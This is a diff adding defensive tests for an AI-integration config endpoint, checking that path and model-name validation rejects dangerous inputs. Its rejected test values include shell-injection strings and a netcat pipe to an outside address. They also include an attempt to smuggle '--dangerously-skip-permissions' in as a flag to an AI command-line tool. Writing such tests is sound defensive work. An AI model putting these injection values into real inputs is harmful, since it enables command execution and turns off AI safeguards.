@@ -155,4 +155,133 @@ describe('PUT /api/config/ai-integrations — path validation', () => {
       expect(invalid.statusCode).toBe(400);
     },
   );
+
+  // ── Windows path support ────────────────────────────────────────────
+  // node:path's isAbsolute() treats `C:\...` as absolute on every
+  // platform — verified by reading the docs and the implementation —
+  // so the validator accepts Windows-style absolute paths regardless
+  // of where the server runs. basename() likewise normalises both
+  // separators. Below tests pin the behaviour so a future "tighten
+  // path validation" change can't silently break Windows installs.
+
+  it('accepts a Windows-style absolute path with .exe extension', async () => {
+    const res = await app.inject({
+      method: 'PUT',
+      url: '/api/config/ai-integrations',
+      payload: { claude: { path: 'C:\\Program Files\\Claude\\claude.exe' } },
+    });
+    expect(res.statusCode).toBe(200);
+  });
+
+  it.each(['.exe', '.cmd', '.bat', '.ps1'])(
+    'accepts a Windows-style absolute path with %s extension',
+    async (ext) => {
+      const res = await app.inject({
+        method: 'PUT',
+        url: '/api/config/ai-integrations',
+        payload: { codex: { path: `C:\\Tools\\codex${ext}` } },
+      });
+      expect(res.statusCode).toBe(200);
+    },
+  );
+
+  it('rejects a Windows-style path whose basename is cmd.exe (RCE pivot)', async () => {
+    const res = await app.inject({
+      method: 'PUT',
+      url: '/api/config/ai-integrations',
+      payload: { claude: { path: 'C:\\Windows\\System32\\cmd.exe' } },
+    });
+    expect(res.statusCode).toBe(400);
+  });
+
+  it('rejects a Windows-style path whose basename is powershell.exe', async () => {
+    const res = await app.inject({
+      method: 'PUT',
+      url: '/api/config/ai-integrations',
+      payload: {
+        aider: {
+          path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
+        },
+      },
+    });
+    expect(res.statusCode).toBe(400);
+  });
+
+  // ── model field validation ──────────────────────────────────────────
+  // `model` flows verbatim into argv when aiPrompt spawns the CLI, so
+  // it needs its own allowlist — without it a string like
+  // "--dangerously-skip-permissions" lands as a separate argv entry
+  // and is interpreted by claude/codex/aider/gemini as a flag.
+  // Allowed character set [A-Za-z0-9._:/-] admits every real model
+  // identifier we ship (claude-opus-4-7, gpt-4o, vendor/model:v1.2)
+  // while rejecting shell metacharacters + `-` prefixes.
+
+  it('accepts a realistic model identifier', async () => {
+    const res = await app.inject({
+      method: 'PUT',
+      url: '/api/config/ai-integrations',
+      payload: { claude: { model: 'claude-opus-4-7' } },
+    });
+    expect(res.statusCode).toBe(200);
+  });
+
+  it('accepts vendor-scoped model identifier with colon tag', async () => {
+    const res = await app.inject({
+      method: 'PUT',
+      url: '/api/config/ai-integrations',
+      payload: { codex: { model: 'openai/gpt-4o:2025-04' } },
+    });
+    expect(res.statusCode).toBe(200);
+  });
+
+  it('accepts empty model (clears override)', async () => {
+    const res = await app.inject({
+      method: 'PUT',
+      url: '/api/config/ai-integrations',
+      payload: { gemini: { model: '' } },
+    });
+    expect(res.statusCode).toBe(200);
+  });
+
+  it('rejects argv-injection via --flag', async () => {
+    const res = await app.inject({
+      method: 'PUT',
+      url: '/api/config/ai-integrations',
+      payload: { claude: { model: '--dangerously-skip-permissions' } },
+    });
+    expect(res.statusCode).toBe(400);
+  });
+
+  it('rejects argv-injection via space-separated extra arg', async () => {
+    const res = await app.inject({
+      method: 'PUT',
+      url: '/api/config/ai-integrations',
+      payload: { claude: { model: 'claude-opus-4-7 --verbose' } },
+    });
+    expect(res.statusCode).toBe(400);
+  });
+
+  it.each([
+    ['shell metacharacter $', 'claude$(touch /tmp/p)'],
+    ['shell metacharacter backtick', 'claude`id`'],
+    ['shell pipe', 'claude | nc 1.2.3.4 8080'],
+    ['null byte attempt', 'claude\0--evil'],
+    ['unicode separator', 'claude arg'],
+  ])('rejects model containing %s', async (_label, model) => {
+    const res = await app.inject({
+      method: 'PUT',
+      url: '/api/config/ai-integrations',
+      payload: { claude: { model } },
+    });
+    expect(res.statusCode).toBe(400);
+  });
+
+  it('rejects model exceeding 128 characters', async () => {
+    const res = await app.inject({
+      method: 'PUT',
+      url: '/api/config/ai-integrations',
+      payload: { claude: { model: 'a'.repeat(129) } },
+    });
+    expect(res.statusCode).toBe(400);
+  });
 });
